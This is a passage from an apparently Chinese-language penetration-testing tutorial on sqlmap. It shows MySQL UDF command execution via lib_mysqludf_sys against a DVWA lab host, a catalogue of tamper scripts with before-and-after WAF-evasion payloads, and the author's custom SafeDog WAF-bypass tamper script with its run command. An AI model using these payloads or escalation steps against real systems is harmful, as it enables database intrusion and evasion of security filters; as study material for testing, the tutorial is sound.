<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>d mysql:<span class="operator">/</span><span class="operator">/</span>root:Admin12345<span class="variable">@192</span><span class="number">.168</span><span class="number">.123</span><span class="number">.188</span>:<span class="number">3306</span><span class="operator">/</span>dvwa <span class="comment">--sql-shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@version</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> @<span class="variable">@plugin</span>_dir</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/03/jySD4HUKl2ZLJ3B.png" alt="image-20211103204311361"></p>
</li>
</ol>
<ol>
<li><p>利用sqlmap上传lib_mysqludf_sys到MySQL插件目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -d mysql://root:Admin12345@192.168.123.188:3306/dvwa --file-write=/root/temp/lib_mysqludf_sys.dll --file-dest=C:\\Wamp\\mysql5.5\\lib\\plugin\\lib_mysqludf_sys.dll </span><br></pre></td></tr></table></figure>
</li>
</ol>
<ol>
<li><p>执行语句创建用户自定义函数</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">sqlmap <span class="operator">-</span>d mysql:<span class="operator">/</span><span class="operator">/</span>root:Admin12345<span class="variable">@192</span><span class="number">.168</span><span class="number">.123</span><span class="number">.188</span>:<span class="number">3306</span><span class="operator">/</span>dvwa <span class="comment">--sql-shell</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">FUNCTION</span> sys_eval <span class="keyword">RETURNS</span> STRING SONAME <span class="string">&#x27;lib_mysqludf_sys.dll&#x27;</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">&#x27;whoami&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p><img src="https://i.loli.net/2021/11/03/vA85OH97UZC6rgM.png" alt="image-20211103214845485"></p>
</li>
</ol>
<h2 id="tamper脚本"><a href="#tamper脚本" class="headerlink" title="tamper脚本"></a>tamper脚本</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>tamper是对sqlmap进行扩展的一系列脚本，主要功能是对本来的<code>payload</code>进行特定的更改以绕过<code>waf/ids</code>。</p>
<p>可以理解为，sqlmap在对漏洞网站自动化注入的时候，如果我们使用了tamper脚本，sqlmap的每个payload都会经过tamper这个包装车间的加工，然后再进行投递。</p>
<h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><p>命令格式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u [url] --tamper [模块名]</span><br></pre></td></tr></table></figure>
<p>根据实际情况，可以同时使用多个脚本，使用-v参数可以看到payload的变化。</p>
<p>举例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://hackrock.com:811/Less-2/?id=1&quot; --dbms mysql --tamper &quot;space2comment,versionedmorekeywords.py&quot;  -v 3 --dbs</span><br></pre></td></tr></table></figure>
<p>在Kali Linux系统中，sqlmap的tamper脚本在<code>cd /usr/share/sqlmap/tamper</code>下</p>
<p><img src="https://i.loli.net/2021/11/04/WRmuVL7eEv3Hhyq.png" alt="image-20211104103012440"></p>
<h3 id="常用tamper脚本说明"><a href="#常用tamper脚本说明" class="headerlink" title="常用tamper脚本说明"></a>常用tamper脚本说明</h3><h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py"></a>apostrophemask.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：将引号替换为utf-8，用于过滤单引号</li>
<li>使用脚本前：<code>tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)</code></li>
<li>使用脚本后：<code>1 AND %EF%BC%871%EF%BC%87=%EF%BC%871</code></li>
</ul>
<h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py"></a>base64encode.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：替换为base64编码</li>
<li>使用脚本前：<code>tamper(&quot;1&#39; AND SLEEP(5)#&quot;)</code></li>
<li>使用脚本后：<code>MScgQU5EIFNMRUVQKDUpIw==</code></li>
</ul>
<h4 id="multiplespaces-py"><a href="#multiplespaces-py" class="headerlink" title="multiplespaces.py"></a>multiplespaces.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：围绕sql关键字添加多个空格</li>
<li>使用脚本前：<code>tamper(&#39;1 UNION SELECT foobar&#39;)</code></li>
<li>使用脚本后：<code>1 UNION SELECT foobar</code></li>
</ul>
<h4 id="space2plus-py"><a href="#space2plus-py" class="headerlink" title="space2plus.py"></a>space2plus.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：用加号替换空格</li>
<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code></li>
<li>使用脚本后：<code>SELECT+id+FROM+users</code></li>
</ul>
<h4 id="nonrecursivereplacement-py"><a href="#nonrecursivereplacement-py" class="headerlink" title="nonrecursivereplacement.py"></a>nonrecursivereplacement.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：作为双重查询语句，用双重语句替代预定义的sql关键字（适用于非常弱的自定义过滤器，例如将select替换为空）</li>
<li>使用脚本前：<code>tamper(&#39;1 UNION SELECT 2--&#39;)</code></li>
<li>使用脚本后：<code>1 UNIOUNIONN SELESELECTCT 2--</code></li>
</ul>
<h4 id="space2randomblank-py"><a href="#space2randomblank-py" class="headerlink" title="space2randomblank.py"></a>space2randomblank.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：将空格替换为其他有效字符</li>
<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code></li>
<li>使用脚本后：<code>SELECT%0Did%0DFROM%0Ausers</code></li>
</ul>
<h4 id="unionalltounion-py"><a href="#unionalltounion-py" class="headerlink" title="unionalltounion.py"></a>unionalltounion.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：将union all select 替换为union select</li>
<li>使用脚本前：<code>tamper(&#39;-1 UNION ALL SELECT&#39;)</code></li>
<li>使用脚本后：<code>-1 UNION SELECT</code></li>
</ul>
<h4 id="securesphere-py"><a href="#securesphere-py" class="headerlink" title="securesphere.py"></a>securesphere.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：追加特定的字符串</li>
<li>使用脚本前：<code>tamper(&#39;1 AND 1=1&#39;)</code></li>
<li>使用脚本后：<code>1 AND 1=1 and &#39;0having&#39;=&#39;0having&#39;</code></li>
</ul>
<h4 id="space2dash-py"><a href="#space2dash-py" class="headerlink" title="space2dash.py"></a>space2dash.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：将空格替换为—，并添加一个随机字符串和换行符</li>
<li>使用脚本前：<code>tamper(&#39;1 AND 9227=9227&#39;)</code></li>
<li>使用脚本后：<code>1--nVNaVoPYeva%0AAND--ngNvzqu%0A9227=9227</code></li>
</ul>
<h4 id="space2mssqlblank-py"><a href="#space2mssqlblank-py" class="headerlink" title="space2mssqlblank.py"></a>space2mssqlblank.py</h4><ul>
<li>适用数据库：Microsoft SQL Server<br>测试通过数据库：Microsoft SQL Server 2000、Microsoft SQL Server 2005</li>
<li>作用：将空格随机替换为其他空格符号(‘%01’, ‘%02’, ‘%03’, ‘%04’, ‘%05’, ‘%06’, ‘%07’, ‘%08’, ‘%09’, ‘%0B’, ‘%0C’, ‘%0D’, ‘%0E’, ‘%0F’, ‘%0A’)</li>
<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code></li>
<li>使用脚本后：<code>SELECT%0Eid%0DFROM%07users</code></li>
</ul>
<h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py"></a>between.py</h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
<ul>
<li>作用：用NOT BETWEEN 0 AND #替换&gt;</li>
<li>使用脚本前：<code>tamper(&#39;1 AND A &gt; B--&#39;)</code></li>
<li>使用脚本后：<code>1 AND A NOT BETWEEN 0 AND B--</code></li>
</ul>
<h4 id="percentage-py"><a href="#percentage-py" class="headerlink" title="percentage.py"></a>percentage.py</h4><ul>
<li>适用数据库：ASP<br>测试通过数据库：Microsoft SQL Server 2000, 2005、MySQL 5.1.56, 5.5.11、PostgreSQL 9.0</li>
<li>作用：在每个字符前添加一个%</li>
<li>使用脚本前：<code>tamper(&#39;SELECT FIELD FROM TABLE&#39;)</code></li>
<li>使用脚本后：<code>%S%E%L%E%C%T %F%I%E%L%D %F%R%O%M %T%A%B%L%E</code></li>
</ul>
<h4 id="sp-password-py"><a href="#sp-password-py" class="headerlink" title="sp_password.py"></a>sp_password.py</h4><ul>
<li>适用数据库：MSSQL</li>
<li>作用：从T-SQL日志的自动迷糊处理的有效载荷中追加sp_password</li>
<li>使用脚本前：<code>tamper(&#39;1 AND 9227=9227-- &#39;)</code></li>
<li>使用脚本后：<code>1 AND 9227=9227-- sp_password</code></li>
</ul>
<h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py"></a>charencode.py</h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
<ul>
<li>作用：对给定的payload全部字符使用url编码（不处理已经编码的字符）</li>
<li>使用脚本前：<code>tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)</code></li>
<li>使用脚本后：<code>%53%45%4C%45%43%54%20%46%49%45%4C%44%20%46%52%4F%4D%20%54%41%42%4C%45</code></li>
</ul>
<h4 id="randomcase-py"><a href="#randomcase-py" class="headerlink" title="randomcase.py"></a>randomcase.py</h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
<ul>
<li>作用：随机大小写</li>
<li>使用脚本前：<code>tamper(&#39;INSERT&#39;)</code></li>
<li>使用脚本后：<code>INseRt</code></li>
</ul>
<h4 id="charunicodeencode-py"><a href="#charunicodeencode-py" class="headerlink" title="charunicodeencode.py"></a>charunicodeencode.py</h4><ul>
<li>适用数据库：ASP、ASP.NET<br>测试通过数据库：Microsoft SQL Server 2000/2005、MySQL 5.1.56、PostgreSQL 9.0.3</li>
<li>作用：适用字符串的unicode编码</li>
<li>使用脚本前：<code>tamper(&#39;SELECT FIELD%20FROM TABLE&#39;)</code></li>
<li>使用脚本后：<code>%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045</code></li>
</ul>
<h4 id="space2comment-py"><a href="#space2comment-py" class="headerlink" title="space2comment.py"></a>space2comment.py</h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
<ul>
<li>作用：将空格替换为/**/</li>
<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code></li>
<li>使用脚本后：<code>SELECT/**/id/**/FROM/**/users</code></li>
</ul>
<h4 id="equaltolike-py"><a href="#equaltolike-py" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h4><p>测试通过数据库：Microsoft SQL Server 2005、MySQL 4, 5.0 and 5.5</p>
<ul>
<li>作用：将=替换为LIKE</li>
<li>使用脚本前：<code>tamper(&#39;SELECT * FROM users WHERE id=1&#39;)</code></li>
<li>使用脚本后：<code>SELECT * FROM users WHERE id LIKE 1</code></li>
</ul>
<h4 id="equaltolike-py-1"><a href="#equaltolike-py-1" class="headerlink" title="equaltolike.py"></a>equaltolike.py</h4><p>测试通过数据库：MySQL 4, 5.0 and 5.5、Oracle 10g、PostgreSQL 8.3, 8.4, 9.0</p>
<ul>
<li>作用：将&gt;替换为GREATEST，绕过对&gt;的过滤</li>
<li>使用脚本前：<code>tamper(&#39;1 AND A &gt; B&#39;)</code></li>
<li>使用脚本后：<code>1 AND GREATEST(A,B+1)=A</code></li>
</ul>
<h4 id="ifnull2ifisnull-py"><a href="#ifnull2ifisnull-py" class="headerlink" title="ifnull2ifisnull.py"></a>ifnull2ifisnull.py</h4><ul>
<li>适用数据库：MySQL、SQLite (possibly)、SAP MaxDB (possibly)<br>测试通过数据库：MySQL 5.0 and 5.5</li>
<li>作用：将类似于IFNULL(A, B)替换为IF(ISNULL(A), B, A)，绕过对IFNULL的过滤</li>
<li>使用脚本前：<code>tamper(&#39;IFNULL(1, 2)&#39;)</code></li>
<li>使用脚本后：<code>IF(ISNULL(1),2,1)</code></li>
</ul>
<h4 id="modsecurityversioned-py"><a href="#modsecurityversioned-py" class="headerlink" title="modsecurityversioned.py"></a>modsecurityversioned.py</h4><ul>
<li>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0</li>
<li>作用：过滤空格，使用mysql内联注释的方式进行注入</li>
<li>使用脚本前：<code>tamper(&#39;1 AND 2&gt;1--&#39;)</code></li>
<li>使用脚本后：<code>1 /*!30874AND 2&gt;1*/--</code></li>
</ul>
<h4 id="space2mysqlblank-py"><a href="#space2mysqlblank-py" class="headerlink" title="space2mysqlblank.py"></a>space2mysqlblank.py</h4><ul>
<li>适用数据库：MySQL<br>测试通过数据库：MySQL 5.1</li>
<li>作用：将空格替换为其他空格符号(‘%09’, ‘%0A’, ‘%0C’, ‘%0D’, ‘%0B’)</li>
<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users&#39;)</code></li>
<li>使用脚本后：<code>SELECT%0Bid%0DFROM%0Cusers</code></li>
</ul>
<h4 id="modsecurityzeroversioned-py"><a href="#modsecurityzeroversioned-py" class="headerlink" title="modsecurityzeroversioned.py"></a>modsecurityzeroversioned.py</h4><ul>
<li>适用数据库：MySQL<br>测试通过数据库：MySQL 5.0</li>
<li>作用：使用内联注释方式（/<em>!00000</em>/）进行注入</li>
<li>使用脚本前：<code>tamper(&#39;1 AND 2&gt;1--&#39;)</code></li>
<li>使用脚本后：<code>1 /*!00000AND 2&gt;1*/--</code></li>
</ul>
<h4 id="space2mysqldash-py"><a href="#space2mysqldash-py" class="headerlink" title="space2mysqldash.py"></a>space2mysqldash.py</h4><ul>
<li>适用数据库：MySQL、MSSQL</li>
<li>作用：将空格替换为 — ，并追随一个换行符</li>
<li>使用脚本前：<code>tamper(&#39;1 AND 9227=9227&#39;)</code></li>
<li>使用脚本后：<code>1--%0AAND--%0A9227=9227</code></li>
</ul>
<h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py"></a>bluecoat.py</h4><ul>
<li>适用数据库：Blue Coat SGOS<br>测试通过数据库：MySQL 5.1,、SGOS</li>
<li>作用：在sql语句之后用有效的随机空白字符替换空格符，随后用LIKE替换=</li>
<li>使用脚本前：<code>tamper(&#39;SELECT id FROM users where id = 1&#39;)</code></li>
<li>使用脚本后：<code>SELECT%09id FROM users where id LIKE 1</code></li>
</ul>
<h4 id="versionedkeywords-py"><a href="#versionedkeywords-py" class="headerlink" title="versionedkeywords.py"></a>versionedkeywords.py</h4><ul>
<li>适用数据库：MySQL<br>测试通过数据库：MySQL 4.0.18, 5.1.56, 5.5.11</li>
<li>作用：注释绕过</li>
<li>使用脚本前：<code>tamper(&#39;1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,100,114,117,58))#&#39;)</code></li>
<li>使用脚本后：<code>1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/, CONCAT(CHAR(58,104,116,116,58),IFNULL(CAST(CURRENT_USER()/*!AS*//*!CHAR*/),CHAR(32)),CHAR(58,100,114,117,58))#</code></li>
</ul>
<h4 id="halfversionedmorekeywords-py"><a href="#halfversionedmorekeywords-py" class="headerlink" title="halfversionedmorekeywords.py"></a>halfversionedmorekeywords.py</h4><ul>
<li>适用数据库：MySQL &lt; 5.1<br>测试通过数据库：MySQL 4.0.18/5.0.22</li>
<li>作用：在每个关键字前添加mysql版本注释</li>
<li>使用脚本前：`tamper(“value’ UNION ALL SELECT CONCAT(CHAR(58,107,112,113,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,97,110,121,58)), NULL, NULL# AND ‘QDWa’=’QDWa”)</li>
<li>使用脚本后：<code>value&#39;/*!0UNION/*!0ALL/*!0SELECT/*!0CONCAT(/*!0CHAR(58,107,112,113,58),/*!0IFNULL(CAST(/*!0CURRENT_USER()/*!0AS/*!0CHAR),/*!0CHAR(</code>32)),/<em>!0CHAR(`58,97,110,121,58)),/</em>!0NULL,/<em>!0NULL#/</em>!0AND ‘QDWa’=’QDWa</li>
</ul>
<h4 id="space2morehash-py"><a href="#space2morehash-py" class="headerlink" title="space2morehash.py"></a>space2morehash.py</h4><ul>
<li>适用数据库：MySQL &gt;= 5.1.13<br>测试通过数据库：MySQL 5.1.41</li>
<li>作用：将空格替换为#，并添加一个随机字符串和换行符</li>
<li>使用脚本前：<code>tamper(&#39;1 AND 9227=9227&#39;)</code></li>
<li>使用脚本后：<code>1%23ngNvzqu%0AAND%23nVNaVoPYeva%0A%23lujYFWfv%0A9227=9227</code></li>
</ul>
<h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py"></a>apostrophenullencode.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：用非法双字节Unicode字符替换单引号</li>
<li>使用脚本前：<code>tamper(&quot;1 AND &#39;1&#39;=&#39;1&quot;)</code></li>
<li>使用脚本后：<code>1 AND %00%271%00%27=%00%271</code></li>
</ul>
<h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py"></a>appendnullbyte.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：在有效载荷的结束位置加载null字节字符编码</li>
<li>使用脚本前：<code>tamper(&#39;1 AND 1=1&#39;)</code></li>
<li>使用脚本后：<code>1 AND 1=1%00</code></li>
</ul>
<h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py"></a>chardoubleencode.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：对给定的payload全部字符使用双重url编码（不处理已经编码的字符）</li>
<li>使用脚本前：<code>tamper(&#39;SELECT FIELD FROM%20TABLE&#39;)</code></li>
<li>使用脚本后：<code>%2553%2545%254C%2545%2543%2554%2520%2546%2549%2545%254C%2544%2520%2546%2552%254F%254D%2520%2554%2541%2542%254C%2545</code></li>
</ul>
<h4 id="unmagicquotes-py"><a href="#unmagicquotes-py" class="headerlink" title="unmagicquotes.py"></a>unmagicquotes.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：用一个多字节组合%bf%27和末尾通用注释一起替换空格</li>
<li>使用脚本前：<code>tamper(&quot;1&#39; AND 1=1&quot;)</code></li>
<li>使用脚本后：<code>1%bf%27 AND 1=1--</code></li>
</ul>
<h4 id="randomcomments-py"><a href="#randomcomments-py" class="headerlink" title="randomcomments.py"></a>randomcomments.py</h4><ul>
<li>适用数据库：ALL</li>
<li>作用：用注释符分割sql关键字</li>
<li>使用脚本前：<code>tamper(&#39;INSERT&#39;)</code></li>
<li>使用脚本后：<code>I/**/N/**/SERT</code></li>
</ul>
<h3 id="tamper脚本的编写"><a href="#tamper脚本的编写" class="headerlink" title="tamper脚本的编写"></a>tamper脚本的编写</h3><h4 id="tamper的结构"><a href="#tamper的结构" class="headerlink" title="tamper的结构"></a>tamper的结构</h4><p>以<code>escapequotes.py</code>这个tamper文件为例</p>
<p>见名知义，该tamper是用来转义的，将单引号转换成<code>\\&#39;</code>，双引号转换成 <code>\\&quot;</code></p>
<p>代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Slash escape single and double quotes (e.g. &#x27; -&gt; \&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;1&quot; AND SLEEP(5)#&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;1\\\\&quot; AND SLEEP(5)#&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload.replace(<span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;\\&#x27;&quot;</span>).replace(<span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;\\&quot;&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>不难看出，一个最小的tamper脚本结构为<code>__priority__变量</code>、<code>dependencies函数</code>和<code>tamper函数</code>。</p>
<h5 id="priority-变量"><a href="#priority-变量" class="headerlink" title="_priority_变量"></a>_<em>priority_</em>变量</h5><p><code>__priority__</code>是当前脚本调用优先等级，该优先级用于使用多个tamper时的执行顺序选择</p>
<p>在自带的tamper脚本中一共有以下几种优先级，还可以自定义<code>-100~100</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">__priority__ = PRIORITY.LOWEST</span><br><span class="line">__priority__ = PRIORITY.LOWER</span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line">__priority__ = PRIORITY.HIGH</span><br><span class="line">__priority__ = PRIORITY.HIGHER</span><br><span class="line">__priority__ = PRIORITY.HIGHEST</span><br></pre></td></tr></table></figure>
<h5 id="dependencies函数"><a href="#dependencies函数" class="headerlink" title="dependencies函数"></a>dependencies函数</h5><p><code>dependencies</code>函数声明该脚本适用或不适用的范围，可以为空，例如：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> lib.core.common <span class="keyword">import</span> singleTimeWarnMessage</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">singleTimeWarnMessage(<span class="string">&quot;tamper script &#x27;%s&#x27; is only meant to be run against %s&quot;</span> % (os.path.basename(__file__).split(<span class="string">&quot;.&quot;</span>)[<span class="number">0</span>], DBMS.ACCESS))</span><br><span class="line"><span class="comment"># singleTimeWarnMessage() 用于在控制台中打印出警告信息</span></span><br></pre></td></tr></table></figure>
<h5 id="tamper函数"><a href="#tamper函数" class="headerlink" title="tamper函数"></a>tamper函数</h5><p><code>tamper</code>是主要的函数，接受的参数为<code>payload</code>和<code>**kwargs</code>，返回值为替换后的payload</p>
<p>这里可以看出返回的是使用了python字符串替换函数replace，将字符串中的单引号和双引号进行转义</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload.replace(&quot;&#x27;&quot;, &quot;\\&#x27;&quot;).replace(&#x27;&quot;&#x27;, &#x27;\\&quot;&#x27;)</span><br></pre></td></tr></table></figure>
<p>而<code>tamper</code>函数不仅有<code>payload</code>参数，还有可变长参数<code>**kwargs</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">def tamper(payload, **kwargs)</span><br></pre></td></tr></table></figure>
<p><code>kwargs</code>是一个字典，其结构为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#x27;headers&#x27;: &#123;&#125;, &#x27;delimiter&#x27;: &#x27;&amp;&#x27;, &#x27;hints&#x27;: &#123;&#125;&#125;</span><br></pre></td></tr></table></figure>
<p>这里的<code>kwargs[&#39;headers&#39;]</code>很明显是我们的请求头，我们可以对其进行自定义。</p>
<h4 id="编写一个简单的tamper脚本"><a href="#编写一个简单的tamper脚本" class="headerlink" title="编写一个简单的tamper脚本"></a>编写一个简单的tamper脚本</h4><p>在编写tamper脚本之前必须先清楚：需要绕过什么样的WAF，这类WAF的有什么绕过方法。</p>
<p>具体WAF的绕过方法我在之前的文章详细讲解过了，我们可以根据绕过WAF的方法来构造我们的tamper脚本。例如以下是我写的绕过安全狗的tamper：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces space character (&#x27; &#x27;) with custom annotator (&#x27;/*//--*/&#x27;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * This tamper script works against safedog-waf.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT/*//--*/id/*//--*/FROM/*//--*/users&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(<span class="built_in">len</span>(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="string">&quot;/*//--//*/&quot;</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="string">&quot;/*//--//*/&quot;</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;DATABASE(&#x27;</span>,<span class="string">&#x27;DATABASE/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;VERSION(&#x27;</span>,<span class="string">&#x27;VERSION/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;CURRENT_USER(&#x27;</span>,<span class="string">&#x27;CURRENT_USER/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;SYSTEM_USER(&#x27;</span>,<span class="string">&#x27;SYSTEM_USER/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;SESSION_USER(&#x27;</span>,<span class="string">&#x27;SESSION_USER/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;USER(&#x27;</span>,<span class="string">&#x27;USER/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;LOAD_FILE(&#x27;</span>,<span class="string">&#x27;LOAD_FILE/*//--//*/(&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;/AS&#x27;</span>,<span class="string">&#x27;/--+/*%0aAS--+*/%0a&#x27;</span>)</span><br><span class="line">            retVal=retVal.replace(<span class="string">&#x27;INFORMATION_SCHEMA&#x27;</span>,<span class="string">&#x27;--+/*%0aINFORMATION_SCHEMA--+*/%0a&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<p>使用脚本绕过安全狗WAF：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.123.42/sqli/Less-2/?id=1&quot; --dbs --tamper &quot;bypass-safedog.py&quot; -v 3 --random-agent --technique U --batch --no-cast</span><br></pre></td></tr></table></figure>
<p>虽然不知道是什么原因只跑出了当前数据库名</p>
